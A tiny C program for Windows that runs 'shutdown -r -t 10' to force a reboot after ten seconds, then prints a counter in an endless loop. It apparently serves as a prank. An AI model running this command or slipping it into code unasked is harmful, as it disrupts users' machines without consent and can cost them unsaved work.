#include <stdio.h>
#include<windows.h>
int main()
{
	
	system("shutdown -r -t 10");
	int a = 0;
	while (1)
	{
		a = a + 1;
		printf("%d", a);
	}
}